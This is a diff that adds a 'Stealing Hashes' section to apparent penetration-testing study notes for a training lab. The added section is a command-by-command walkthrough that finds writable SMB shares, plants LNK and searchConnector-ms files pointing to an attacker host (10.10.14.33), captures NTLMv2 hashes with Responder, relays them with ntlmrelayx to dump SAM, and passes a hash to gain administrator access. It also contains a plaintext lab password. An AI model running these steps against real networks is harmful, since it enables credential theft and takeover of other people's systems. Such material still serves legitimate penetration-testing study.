@@ -239,26 +239,91 @@ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shar
 
 # Stealing Hashes
 
+To steal hashes using shared folders, we can create a shortcut and configure it so that the icon that appears in the shortcut points to our fake shared folder. Once the user enters the shared folder, it will try to look for the icon's location, forcing the authentication against our shared folder.
 
+Reference: https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
 
+## Slinky Module
 
+The module creates Windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions. When someone visits the share, we will get their NTLMv2 hash using Responder because the icon attribute contains a UNC path to our server.
 
+The module has two mandatory options, `SERVER` and `NAME`, and one optional `CLEANUP`.
 
+`SERVER` corresponds to the IP of the SMB server we control and where we want the UNC path to point. The `NAME` option assigns a name to the shortcut file, and `CLEANUP` is to delete the shortcut once we finish.
 
+## Stealing NTLMv2 Hashes
 
+- **Finding Shares with WRITE Privileges**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
+```
+Therefore we can use the module Slinky to write an LNK file to each share. We will use the option SERVER=10.10.14.33, the IP address corresponding to our attack host's tun0 network, and the option NAME=important, which is the file name we are assigning to the LNK file.
+- **Using Slinky**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
+```
+- **Starting Responder**
+```
+sudo responder -I tun0
+```
+> Note: The SMB option should be `On` in the `Responder.conf` file to capture the hash.
 
+### NTLM Relay
 
+Another solution is to relay the NTLMv2 hash directly to other servers and workstations on the network where SMB Signing is disabled. SMB Signing is essential because if a computer has SMB Signing enabled, we can't relay to that computer because we will be unable to prove our attack host's identity. To get a list of targets with SMB Signing disabled, we can use the option `--gen-relay-list`. Now we can use Proxychains and get a list of the machines with SMB Signing disabled.
 
+- **Getting Relay List**
+```
+proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt
+```
+We will use `ntlmrelayx` with the previous list we got from the option `--gen-relay-list`. If we find an account with local administrator privileges on the target machine, if no other options are specified, `ntlmrelayx` will automatically dump the SAM database of the target machine and we would be able to attempt to perform a pass-the-hash attack with any local admin user hashes.
 
+- **Execute NTLMRelayX**
+```
+sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+```
 
+We need to wait until a user accesses the SMB share, and our LNK file forces them to connect to our target machine (this happens in the background, and the user will not notice anything out of the ordinary). Once this is done, we should see something like this in the ntlmrelayx console:
 
+- **Testing Local Accounts**
+```
+proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth
+```
 
+- **Cleanup Everything**
 
+When we finish with the module, cleaning up the LNK file using the option `-o CLEANUP=YES` and the name of the LNK file `NAME=important` is crucial.
 
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES
+```
 
+## Stealing Hashes with `drop-sc` Module
 
+Before concluding this section, let's look at another method of forcing authentication using a file format other than `LNK`, the `.searchConnector-ms` and `.library-ms` formats. Both of these file formats have default file associations on most Windows versions. They integrate with Windows to show content from an arbitrary location which can also be a remote location, by specifying a `WebDAV` share.
 
+In essence, they perform the same function as the LNK file. To learn more about the discovery of this method, we can read the blog post Exploring search connectors and library files in Windows.
 
+Reference: https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
 
+CrackMapExec has a module named `drop-sc`, which allows us to create a `searchConnector-ms` file in a shared folder. To use it, we need to specify the option `URL` to target our SMB fake server. In this case, our host running `ntlmrelayx`. The URL needs to be escaped with double backslashes (`\`), for example: `URL=\\\\10.10.14.33\\secret`.
 
+Optionally we can specify the following options:
+- The target shared folder with the option `SHARE=name`. If we don't specify this option, it will write the file in all shares with `WRITE` permissions.
+- The filename with the option `FILENAME=name`. If we don't specify this option, it will create a file named "Documents."
+- The option `CLEANUP=True` if we want to clean the files we created. We need to specify the filename option if we use a custom name.
 
+- **Dropping a searchConnector-ms File**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
+```
+Once a user accesses the shared folder, and while we have `ntlmrelayx` listening, we should also be able to relay to the target machine.
+
+- **Relaying Using NTLMRelayx and drop-sc**
+```
+sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+```
+- **Cleaning Up searchConnector-ms Files**
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret
+```
